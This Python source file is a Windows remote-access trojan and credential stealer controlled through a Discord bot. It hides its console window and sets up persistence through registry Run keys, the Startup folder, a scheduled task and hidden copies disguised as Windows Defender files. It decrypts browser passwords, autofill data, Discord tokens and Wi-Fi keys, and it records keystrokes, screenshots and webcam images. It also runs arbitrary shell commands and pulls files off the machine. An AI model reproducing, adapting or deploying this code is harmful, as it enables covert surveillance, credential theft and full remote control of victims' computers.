# -----------------------------------------------------------------------------
# Copyright (c) 2025 pxwild. All Rights Reserved.
# pxwild PROPRIETARY AND CONFIDENTIAL — NOT FOR MODIFICATION OR REDISTRIBUTION.
#
# This software and its source code are proprietary to pxwild. Unauthorized
# copying, modification, distribution, decompilation, reverse engineering, or
# creation of derivative works is strictly prohibited without prior written
# permission from pxwild. Any attempt to modify or remove this notice is a
# material breach of the license and will be acted upon to the fullest extent
# permitted by law.
# -----------------------------------------------------------------------------

import requests
import tempfile
import os
import ctypes
import platform
import shutil
import time
import io
import json
import getpass
import webbrowser
import sqlite3
import winreg
import base64
import random
import string
import threading
import zipfile
import re
import glob
import logging
import asyncio
import filecmp
import subprocess
import sys
import urllib.request
from pathlib import Path

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
from datetime import datetime, timedelta
try:
    import cv2
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False
try:
    from PIL import ImageGrab, Image
    import numpy as np
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
try:
    import pyaudio
    import wave
    PY_AUDIO_AVAILABLE = True
except ImportError:
    PY_AUDIO_AVAILABLE = False
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
try:
    import win32clipboard
    import win32crypt
    WIN32CLIP_AVAILABLE = True
except ImportError:
    WIN32CLIP_AVAILABLE = False
try:
    import winsound
    WINSOUND_AVAILABLE = True
except ImportError:
    WINSOUND_AVAILABLE = False
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False
try:
    from Cryptodome.Cipher import AES
    CRYPTODOME_AVAILABLE = True
except ImportError:
    CRYPTODOME_AVAILABLE = False
try:
    import discord
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
try:
    from ctypes import c_bool, c_ulong
    CTYPES_BOOL_ULONG = True
except ImportError:
    CTYPES_BOOL_ULONG = False
log = logging.getLogger("discord")
log.setLevel(logging.CRITICAL)
logging.getLogger("discord.client").setLevel(logging.CRITICAL)
logging.getLogger("discord.gateway").setLevel(logging.CRITICAL)
logging.getLogger("discord.http").setLevel(logging.CRITICAL)
logging.basicConfig(level=logging.CRITICAL)
if sys.platform != 'win32':
    sys.exit(1)
original_exe = sys.executable.lower()
pythonw_path = sys.executable.replace('\\python.exe', '\\pythonw.exe').replace('/python.exe', '/pythonw.exe')
if 'python.exe' in original_exe:
    try:
        os.execv(pythonw_path, [pythonw_path] + sys.argv)
    except:
        pass
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
STARTUP_FILENAME = "WindowsDefenderUpdate.py"
REGISTRY_KEY_NAME = "Windows Security Service"
MUTEX_NAME = "Global\\\\WindowsDefenderServiceMutex"
PROCESS_MONITOR_INTERVAL = 5
RESTART_DELAY = 3
RECONNECT_DELAY = 10
MAX_RECONNECT_ATTEMPTS = 1000
KEYLOG_FILE = os.path.join(tempfile.gettempdir(), "keylog.txt")
keylogger_active = False
keylog_listener = None
BOT_TOKEN = '{token}'
DISCORD_CHANNEL_ID = {channel_id}
connected = False
processed_messages = set()
ip = "Unknown"
user = None
hostname = None
LOCAL = os.getenv("LOCALAPPDATA")
APPDATA = os.getenv("APPDATA")
PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
    'Brave': os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'Vivaldi': os.path.join(LOCAL, 'Vivaldi', 'User Data'),
    'Yandex': os.path.join(LOCAL, 'Yandex', 'YandexBrowser', 'User Data'),
    'Opera': os.path.join(APPDATA, 'Opera Software', 'Opera Stable'),
}
def random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length)) + '.py'
def create_mutex():
    try:
        handle = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
        if ctypes.windll.kernel32.GetLastError() == 183:
            return None
        return handle
    except:
        return None
def get_startup_path():
    try:
        username = getpass.getuser()
        return f"C:\\\\Users\\\\{username}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup"
    except:
        return None
def get_current_script_path():
    return os.path.abspath(__file__)
def is_running_from_startup():
    current_path = get_current_script_path()
    startup_path = get_startup_path()
    if startup_path:
        return current_path.lower().startswith(startup_path.lower())
    return False
def hide_terminal():
    try:
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
            user32.UpdateWindow(hwnd)
            kernel32.FreeConsole()
    except:
        pass
def install_to_startup():
    try:
        startup_path = get_startup_path()
        if not startup_path or not os.path.exists(startup_path):
            return None
        current_file = get_current_script_path()
        startup_copy = os.path.join(startup_path, STARTUP_FILENAME)
        if not is_running_from_startup():
            try:
                shutil.copy2(current_file, startup_copy)
                ctypes.windll.kernel32.SetFileAttributesW(startup_copy, 6)
            except Exception as e:
                return None
        add_to_registry(startup_copy)
        add_scheduled_task(startup_copy)
        return startup_copy
    except Exception as e:
        return None
def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REGISTRY_KEY_NAME, 0, winreg.REG_SZ,
                         f'"{pythonw_path}" "{file_path}"')
        winreg.CloseKey(key)
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, REGISTRY_KEY_NAME, 0, winreg.REG_SZ,
                             f'"{pythonw_path}" "{file_path}"')
            winreg.CloseKey(key)
        except:
            pass
    except Exception as e:
        pass
def add_scheduled_task(file_path):
    try:
        task_name = "WindowsSecurityUpdateTask"
        cmd = f'schtasks /create /tn "{task_name}" /tr "\"{pythonw_path}\" \"{file_path}\"" /sc onlogon /rl highest /f'
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
def remove_scheduled_task():
    try:
        task_name = "WindowsSecurityUpdateTask"
        cmd = f'schtasks /delete /tn "{task_name}" /f'
        subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
def remove_from_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REGISTRY_KEY_NAME)
        winreg.CloseKey(key)
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, REGISTRY_KEY_NAME)
            winreg.CloseKey(key)
        except:
            pass
    except:
        pass
def create_backup_copies():
    backup_locations = [
        os.path.join(os.environ.get('TEMP', ''), random_name()),
        os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', random_name()),
        os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', random_name()),
        os.path.join(os.environ.get('PROGRAMDATA', ''), 'Microsoft', 'Windows', random_name())
    ]
    current_file = get_current_script_path()
    created_backups = []
    for backup_path in backup_locations:
        try:
            os.makedirs(os.path.dirname(backup_path), exist_ok=True)
            shutil.copy2(current_file, backup_path)
            ctypes.windll.kernel32.SetFileAttributesW(backup_path, 6)
            created_backups.append(backup_path)
        except:
            continue
    return created_backups
def monitor_and_restart():
    current_pid = os.getpid()
    startup_path = get_startup_path()
    startup_file = os.path.join(startup_path, STARTUP_FILENAME) if startup_path else None
    while True:
        try:
            time.sleep(PROCESS_MONITOR_INTERVAL)
            if PSUTIL_AVAILABLE:
                if not psutil.pid_exists(current_pid):
                    break
            else:
                try:
                    os.kill(current_pid, 0)
                except OSError:
                    break
            if startup_file and not os.path.exists(startup_file):
                install_to_startup()
        except Exception as e:
            time.sleep(RESTART_DELAY)
            continue
    restart_process()
def restart_process():
    try:
        startup_path = get_startup_path()
        if startup_path:
            startup_file = os.path.join(startup_path, STARTUP_FILENAME)
            if os.path.exists(startup_file):
                subprocess.Popen([pythonw_path, startup_file],
                               creationflags=subprocess.CREATE_NO_WINDOW)
                return
        subprocess.Popen([pythonw_path, get_current_script_path()],
                       creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        pass
def setup_persistence():
    try:
        install_to_startup()
        create_backup_copies()
        monitor_thread = threading.Thread(target=monitor_and_restart, daemon=True)
        monitor_thread.start()
        return True
    except Exception as e:
        return False
def get_discord_token():
    if not WIN32CLIP_AVAILABLE or not CRYPTO_AVAILABLE:
        return None
    discord_path = os.path.join(os.environ['APPDATA'], 'discord')
    local_state_path = os.path.join(discord_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None
    leveldb_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
    if not os.path.exists(leveldb_path):
        return None
    tokens = []
    for file_path in glob.glob(os.path.join(leveldb_path, '*.ldb')) + glob.glob(os.path.join(leveldb_path, '*.log')) + glob.glob(os.path.join(leveldb_path, '*.db')):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            for match in re.finditer(r'"token"\s*:\s*"([^"]+)"', content):
                enc_token = match.group(1).replace('\\', '')
                try:
                    token_bytes = base64.b64decode(enc_token + '=' * (4 - len(enc_token) % 4))
                    nonce = token_bytes[:12]
                    ciphertext = token_bytes[12:]
                    aesgcm = AESGCM(key)
                    decrypted_token = aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8')
                    if len(decrypted_token) > 50:
                        tokens.append(decrypted_token)
                except:
                    pass
        except:
            pass
    return tokens[0] if tokens else None
def zip_directory(path, zip_path):
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(path))
                    zipf.write(file_path, arcname)
        return True
    except:
        return False
def decrypt_password(encrypted_value, key=None):
    try:
        if WIN32CLIP_AVAILABLE:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, None, 1)[1].decode('utf-8')
        return "[Decryption not available]"
    except:
        return "[Decryption failed]"
def encrypt_browser_key(path):
    try:
        with open(os.path.join(path, "Local State"), encoding="utf-8") as f:
            key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None
def decrypt_buffer(buff, key):
    if CRYPTODOME_AVAILABLE:
        try:
            iv, payload = buff[3:15], buff[15:]
            return AES.new(key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode()
        except:
            pass
    try:
        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except:
        return ""
def ext_passwords():
    res = []
    for browser, path in PATHS.items():
        if not os.path.exists(path):
            continue
        key = encrypt_browser_key(path)
        if not key:
            continue
        for profile in os.listdir(path):
            if profile != "Default" and not profile.startswith("Profile"):
                continue
            db_path = os.path.join(path, profile, "Login Data")
            if not os.path.exists(db_path):
                continue
            tmp_db = os.path.join(os.getenv("TEMP"), "tmp.db")
            try:
                shutil.copy2(db_path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pwd in cur.fetchall():
                    if user.strip() or pwd:
                        dec_pwd = decrypt_buffer(pwd, key) if pwd else ""
                        if user.strip() or dec_pwd.strip():
                            res.append({
                                "browser": browser,
                                "profile": profile,
                                "url": url,
                                "username": user,
                                "password": dec_pwd
                            })
                cur.close()
                conn.close()
                os.remove(tmp_db)
            except:
                pass
    return res
def autofills():
    res = []
    for browser, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for profile in os.listdir(path):
            if profile != "Default" and not profile.startswith("Profile"):
                continue
            db_path = os.path.join(path, profile, "Web Data")
            if not os.path.exists(db_path):
                continue
            tmp_db = os.path.join(os.getenv("TEMP"), "webdata_tmp.db")
            try:
                shutil.copy2(db_path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cur = conn.cursor()
                cur.execute("SELECT name, value FROM autofill")
                for name, value in cur.fetchall():
                    if name.strip() or value.strip():
                        res.append({
                            "browser": browser,
                            "name": name,
                            "value": value
                        })
                cur.close()
                conn.close()
                os.remove(tmp_db)
            except:
                pass
    firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    if os.path.exists(firefox_path):
        for profile in os.listdir(firefox_path):
            if os.path.isdir(os.path.join(firefox_path, profile)):
                formhistory_db = os.path.join(firefox_path, profile, "formhistory.sqlite")
                if os.path.exists(formhistory_db):
                    tmp_db = os.path.join(os.getenv("TEMP"), f"firefox_formhistory_tmp.db")
                    try:
                        shutil.copy2(formhistory_db, tmp_db)
                        conn = sqlite3.connect(tmp_db)
                        cur = conn.cursor()
                        cur.execute("SELECT fieldname, value FROM moz_formhistory")
                        for name, value in cur.fetchall():
                            if name.strip() or value.strip():
                                res.append({
                                    "browser": f"Firefox ({profile})",
                                    "name": name,
                                    "value": value
                                })
                        cur.close()
                        conn.close()
                        os.remove(tmp_db)
                    except:
                        pass
    return [r for r in res if r["name"].strip() or r["value"].strip()]
def get_app_accounts():
    accounts_info = ""
    discord_token = get_discord_token()
    if discord_token:
        accounts_info += "Discord: Token found (active account)\n"
    steam_path = os.path.expanduser("~\\AppData\\Roaming\\Software\\Valve\\Steam")
    if os.path.exists(steam_path):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Valve\\Steam\\ActiveProcess")
            username, _ = winreg.QueryValueEx(key, "ActiveUser")
            winreg.CloseKey(key)
            accounts_info += f"Steam: {username}\n"
        except:
            pass
    spotify_path = os.path.expanduser("~\\AppData\\Roaming\\Spotify")
    if os.path.exists(spotify_path):
        prefs = os.path.join(spotify_path, "prefs")
        if os.path.exists(prefs):
            with open(prefs, 'r') as f:
                for line in f:
                    if "username" in line:
                        username = line.split("=")[1].strip('"')
                        if username:
                            accounts_info += f"Spotify: {username}\n"
                        break
    thunderbird_path = os.path.expanduser("~\\AppData\\Roaming\\Thunderbird\\Profiles")
    if os.path.exists(thunderbird_path):
        for profile in os.listdir(thunderbird_path):
            profile_path = os.path.join(thunderbird_path, profile, "prefs.js")
            if os.path.exists(profile_path):
                with open(profile_path, 'r') as f:
                    for line in f:
                        if "mail.identity.id" in line and "useremail" in line:
                            email = line.split('"')[1]
                            if email:
                                accounts_info += f"Thunderbird ({profile}): {email}\n"
                            break
    firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    if os.path.exists(firefox_path):
        for profile_folder in os.listdir(firefox_path):
            if os.path.isdir(os.path.join(firefox_path, profile_folder)):
                logins_json = os.path.join(firefox_path, profile_folder, "logins.json")
                if os.path.exists(logins_json):
                    try:
                        with open(logins_json, 'r', encoding='utf-8') as f:
                            logins_data = json.load(f)
                        if 'logins' in logins_data:
                            for login in logins_data['logins']:
                                if 'hostname' in login and 'encryptedUsername' in login:
                                    domain = login['hostname']
                                    accounts_info += f"Firefox ({profile_folder}) - {domain}: Account found\n"
                    except:
                        pass
    opera_path = os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable")
    if os.path.exists(opera_path):
        login_data = os.path.join(opera_path, "Default", "Login Data")
        if os.path.exists(login_data):
            accounts_info += "Opera: Accounts found\n"
    roblox_path = os.path.join(os.environ['LOCALAPPDATA'], 'Roblox')
    if os.path.exists(roblox_path):
        try:
            config_path = os.path.join(roblox_path, 'GlobalSettings.xml')
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    content = f.read()
                match = re.search(r'<UserId>(\d+)</UserId>', content)
                if match:
                    accounts_info += f"Roblox: User ID {match.group(1)}\n"
        except:
            accounts_info += "Roblox: Installed\n"
    mc_path = os.path.join(os.environ['APPDATA'], '.minecraft')
    if os.path.exists(mc_path):
        try:
            profiles_path = os.path.join(mc_path, 'launcher_profiles.json')
            if os.path.exists(profiles_path):
                with open(profiles_path, 'r') as f:
                    data = json.load(f)
                if 'profiles' in data:
                    for name, prof in data['profiles'].items():
                        if 'username' in prof:
                            accounts_info += f"Minecraft ({name}): {prof['username']}\n"
        except:
            accounts_info += "Minecraft: Installed\n"
    telegram_path = os.path.join(os.environ['APPDATA'], 'Telegram Desktop')
    if os.path.exists(telegram_path):
        accounts_info += "Telegram: Installed (phone in settings)\n"
    epic_path = os.path.join(os.environ['LOCALAPPDATA'], 'EpicGamesLauncher')
    if os.path.exists(epic_path):
        accounts_info += "Epic Games: Installed\n"
    autofill_data = autofills()
    if autofill_data:
        accounts_info += "\nAutofill Data (Potential Accounts):\n"
        for item in autofill_data[:20]:
            if item["name"].lower() in ["email", "username", "phone"] or "@" in item["value"]:
                accounts_info += f"{item['browser']} - {item['name']}: {item['value']}\n"
    return accounts_info if accounts_info else "No accounts found"
def get_saved_passwords():
    passwords_info = ""
    ext_data = ext_passwords()
    if ext_data:
        passwords_info += "Browser Passwords:\n"
        site_accounts = {}
        for item in ext_data:
            domain = item['url'].split('/')[2] if '/' in item['url'] else item['url']
            if domain not in site_accounts:
                site_accounts[domain] = []
            site_accounts[domain].append(f"{item['username']}: {item['password']}")
        for domain, creds in site_accounts.items():
            passwords_info += f"{domain}:\n" + "\n".join(creds) + "\n"
    firefox_creds = []
    firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    if os.path.exists(firefox_path):
        for profile in os.listdir(firefox_path):
            if os.path.isdir(os.path.join(firefox_path, profile)):
                logins_json = os.path.join(firefox_path, profile, "logins.json")
                if os.path.exists(logins_json):
                    try:
                        with open(logins_json, 'r', encoding='utf-8') as f:
                            logins_data = json.load(f)
                        if 'logins' in logins_data:
                            for login in logins_data['logins']:
                                url = login['hostname']
                                username = login.get('username', '[encrypted]')
                                password = '[encrypted - NSS required for decryption]'
                                firefox_creds.append(f"Firefox ({profile}) - {url}: {username}: {password}")
                    except:
                        pass
    if firefox_creds:
        passwords_info += "\nFirefox Passwords:\n" + "\n".join(firefox_creds) + "\n"
    wifi_profiles = []
    try:
        output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, errors='ignore')
        profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
        for profile in profiles:
            try:
                result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True, text=True, errors='ignore')
                for line in result.split('\n'):
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        if password:
                            wifi_profiles.append(f"{profile}: {password}")
            except:
                pass
    except:
        pass
    if wifi_profiles:
        passwords_info += "\nWiFi Passwords:\n" + "\n".join(wifi_profiles) + "\n"
    try:
        cred_output = subprocess.check_output("cmdkey /list", shell=True, text=True, errors='ignore')
        creds = [line for line in cred_output.split('\n') if 'Target:' in line and 'Type: Domain password' in line]
        if creds:
            passwords_info += "\nStored Credentials:\n" + "\n".join(creds[:10]) + "\n"
    except:
        pass
    try:
        net_output = subprocess.check_output("net use", shell=True, text=True, errors='ignore')
        if 'There are no entries' not in net_output:
            passwords_info += "\nNetwork Connections:\n" + net_output + "\n"
    except:
        pass
    try:
        vault_output = subprocess.check_output("vaultcmd /list", shell=True, text=True, errors='ignore')
        passwords_info += "\nWindows Vault:\n" + vault_output + "\n"
    except:
        pass
    return passwords_info if passwords_info else "No passwords found"
def screenshots():
    try:
        if PIL_AVAILABLE:
            img = ImageGrab.grab()
            img_buffer = io.BytesIO()
            img.save(img_buffer, format='PNG')
            data = img_buffer.getvalue()
            img_buffer.close()
            return data
        elif PYAUTOGUI_AVAILABLE:
            pyautogui.screenshot("screenshot.png")
            with open("screenshot.png", 'rb') as f:
                data = f.read()
            os.remove("screenshot.png")
            return data
        else:
            return None
    except:
        return None
def webcams():
    if not OPENCV_AVAILABLE or not PIL_AVAILABLE:
        return None
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return None
        img = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        img_buffer = io.BytesIO()
        img.save(img_buffer, format='PNG')
        img_data = img_buffer.getvalue()
        img_buffer.close()
        return img_data
    except:
        return None
def start_keylogger():
    global keylogger_active, keylog_listener
    if not PYNPUT_AVAILABLE:
        return False
    if keylogger_active:
        return True
    try:
        keys = []
        def on_press(key):
            try:
                keys.append(str(key).replace("'", ""))
                if len(keys) > 50:
                    with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                        f.write("".join(keys) + "\n")
                    keys.clear()
            except:
                pass
        keylog_listener = keyboard.Listener(on_press=on_press)
        keylog_listener.start()
        keylogger_active = True
        return True
    except:
        return False
def stop_keylogger():
    global keylogger_active, keylog_listener
    if keylog_listener:
        keylog_listener.stop()
    keylogger_active = False
def get_screenshots_gallery():
    try:
        username = getpass.getuser()
        screenshots_path = f"C:\\Users\\{username}\\Pictures\\Screenshots"
        if not os.path.exists(screenshots_path):
            return f"Screenshots folder not found at: {screenshots_path}"
        image_files = glob.glob(os.path.join(screenshots_path, "*.png")) + \
                     glob.glob(os.path.join(screenshots_path, "*.jpg")) + \
                     glob.glob(os.path.join(screenshots_path, "*.jpeg")) + \
                     glob.glob(os.path.join(screenshots_path, "*.bmp"))
        if not image_files:
            return f"No screenshots found in: {screenshots_path}"
        zip_path = os.path.join(tempfile.gettempdir(), "screenshots_gallery.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for image_file in image_files:
                zipf.write(image_file, os.path.basename(image_file))
        with open(zip_path, 'rb') as f:
            zip_data = f.read()
        os.remove(zip_path)
        return ('file', zip_data, 'screenshots_gallery.zip')
    except Exception as e:
        return f"Gallery error: {e}"
def get_downloads_contents():
    try:
        username = getpass.getuser()
        downloads_path = f"C:\\Users\\{username}\\Downloads"
        if not os.path.exists(downloads_path):
            return f"Downloads folder not found at: {downloads_path}"
        files = os.listdir(downloads_path)
        if not files:
            return "Downloads folder is empty"
        file_info = []
        for file in files[:100]:
            file_path = os.path.join(downloads_path, file)
            if os.path.isfile(file_path):
                size = os.path.getsize(file_path)
                size_str = f"{size / (1024*1024):.1f} MB" if size > 1024*1024 else f"{size / 1024:.1f} KB"
                file_info.append(f"📄 {file} ({size_str})")
            else:
                file_info.append(f"📁 {file} [FOLDER]")
        output = f"Downloads Folder Contents ({downloads_path}):\n" + "\n".join(file_info[:50])
        if len(file_info) > 50:
            output += f"\n... and {len(file_info) - 50} more files"
        return output
    except Exception as e:
        return f"Downloads error: {e}"
def pull_specific_file(filename):
    try:
        username = getpass.getuser()
        search_dirs = [
            f"C:\\Users\\{username}\\Downloads",
            f"C:\\Users\\{username}\\Pictures\\Screenshots",
            f"C:\\Users\\{username}\\Desktop",
            f"C:\\Users\\{username}\\Documents"
        ]
        found_files = []
        for search_dir in search_dirs:
            if not os.path.exists(search_dir):
                continue
            for root, dirs, files in os.walk(search_dir):
                if filename in files:
                    file_path = os.path.join(root, filename)
                    if os.access(file_path, os.R_OK):
                        found_files.append(file_path)
        if not found_files:
            return f"File '{filename}' not found in: Downloads, Screenshots, Desktop, or Documents"
        file_path = found_files[0]
        with open(file_path, 'rb') as f:
            file_data = f.read()
        return ('file', file_data, filename)
    except Exception as e:
        return f"Pull file error: {e}"
def get_comprehensive_browser_history():
    try:
        history_info = "Comprehensive Browser History (Recent Activity):\n"
        browsers = [
            ("Chrome", os.path.join(PATHS['Chrome'], "Default", "History")),
            ("Edge", os.path.join(PATHS['Edge'], "Default", "History")),
            ("Brave", os.path.join(PATHS['Brave'], "Default", "History")),
            ("Opera", os.path.join(PATHS['Opera'], "History")),
        ]
        for browser_name, browser_db in browsers:
            if os.path.exists(browser_db):
                try:
                    temp_db = os.path.join(tempfile.gettempdir(), f"temp_{browser_name}_history")
                    shutil.copy2(browser_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("""
                        SELECT url, title, last_visit_time 
                        FROM urls 
                        ORDER BY last_visit_time DESC 
                        LIMIT 20
                    """)
                    results = cursor.fetchall()
                    if results:
                        history_info += f"\n--- {browser_name} (Last 20 sites) ---\n"
                        for url, title, visit_time in results:
                            if visit_time:
                                try:
                                    dt = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                                    date_str = dt.strftime("%Y-%m-%d %H:%M:%S")
                                except:
                                    date_str = "Recent"
                            else:
                                date_str = "Recent"
                            clean_title = title[:100] + "..." if title and len(title) > 100 else title
                            history_info += f"{date_str}: {clean_title}\n"
                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    history_info += f"\n--- {browser_name} Error: {str(e)} ---\n"
        firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                if os.path.isdir(os.path.join(firefox_path, profile)):
                    places_db = os.path.join(firefox_path, profile, "places.sqlite")
                    if os.path.exists(places_db):
                        temp_db = os.path.join(tempfile.gettempdir(), f"temp_firefox_history_{profile}")
                        try:
                            shutil.copy2(places_db, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("""
                                SELECT url, title, last_visit_date 
                                FROM moz_places 
                                ORDER BY last_visit_date DESC 
                                LIMIT 20
                            """)
                            results = cursor.fetchall()
                            if results:
                                history_info += f"\n--- Firefox ({profile}) (Last 20 sites) ---\n"
                                for url, title, visit_time in results:
                                    if visit_time:
                                        dt = datetime(1970, 1, 1) + timedelta(microseconds=visit_time)
                                        date_str = dt.strftime("%Y-%m-%d %H:%M:%S")
                                    else:
                                        date_str = "Recent"
                                    clean_title = title[:100] + "..." if title and len(title) > 100 else title
                                    history_info += f"{date_str}: {clean_title}\n"
                            conn.close()
                            os.remove(temp_db)
                        except Exception as e:
                            pass
        return history_info if history_info != "Comprehensive Browser History (Recent Activity):\n" else "No browser history found"
    except Exception as e:
        return f"Browser history error: {e}"
def handle_command(command):
    try:
        if not command:
            return "No command provided."
        if command.lower() == "exit":
            return "Exit command received."
        if command.lower() == "ip":
            r = requests.get('https://api64.ipify.org?format=json')
            response = r.json()
            return response['ip']
        elif command.lower() == "sysinfo":
            info = f"System Information:\n- OS: {platform.system()} {platform.release()}\n- Version: {platform.version()}\n- Machine: {platform.machine()}\n- Processor: {platform.processor()}\n- Username: {os.getlogin()}\n- Current Directory: {os.getcwd()}\n- Hostname: {platform.node()}\n- Python: {platform.python_version()}"
            return info
        elif command.lower() == "pwd":
            return os.getcwd()
        elif command.lower() == "processes":
            try:
                output = subprocess.check_output("tasklist", shell=True, text=True)
            except Exception as e:
                output = str(e)
            return output
        elif command.lower().startswith("processkill "):
            pid_str = command[12:].strip()
            try:
                pid = int(pid_str)
                result = subprocess.run(f"taskkill /f /pid {pid}", shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return result.stdout if result.returncode == 0 else result.stderr
            except:
                return "Invalid PID"
        elif command.lower().startswith("execute "):
            shell_cmd = command[8:]
            try:
                output = subprocess.check_output(shell_cmd, shell=True, stderr=subprocess.STDOUT, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except Exception as e:
                return str(e)
        elif command.lower().startswith("kill "):
            process_name = command[5:]
            try:
                result = subprocess.run(f"taskkill /f /im {process_name}", shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                output = result.stdout if result.returncode == 0 else f"Failed: {result.stderr}"
            except Exception as e:
                output = f"Error: {e}"
            return output
        elif command.lower().startswith("cd "):
            new_dir = command[3:]
            try:
                os.chdir(new_dir)
                output = f"Changed to: {os.getcwd()}"
            except Exception as e:
                output = f"Error: {e}"
            return output
        elif command.lower() == "dir" or command.lower() == "ls":
            try:
                files = os.listdir()
                output = "\n".join(files)
            except Exception as e:
                output = f"Error: {e}"
            return output
        elif command.lower().startswith("download "):
            filename = command[9:]
            try:
                if os.path.exists(filename) and os.path.isfile(filename):
                    if os.access(filename, os.R_OK):
                        with open(filename, 'rb') as f:
                            file_data = f.read()
                        return ('file', file_data, filename)
                    else:
                        return "Permission denied: Cannot read file"
                else:
                    return "File not found"
            except Exception as e:
                return f"Error: {e}"
        elif command.lower().startswith("upload "):
            return "Upload not supported in this mode."
        elif command.lower().startswith("download_dir "):
            dir_path = command[13:]
            try:
                if os.path.exists(dir_path) and os.path.isdir(dir_path):
                    zip_path = os.path.join(tempfile.gettempdir(), "temp_dir.zip")
                    if zip_directory(dir_path, zip_path):
                        with open(zip_path, 'rb') as f:
                            file_data = f.read()
                        os.remove(zip_path)
                        return ('file', file_data, f"{os.path.basename(dir_path)}.zip")
                    else:
                        return "Failed to zip directory"
                else:
                    return "Directory not found"
            except Exception as e:
                return f"Error: {e}"
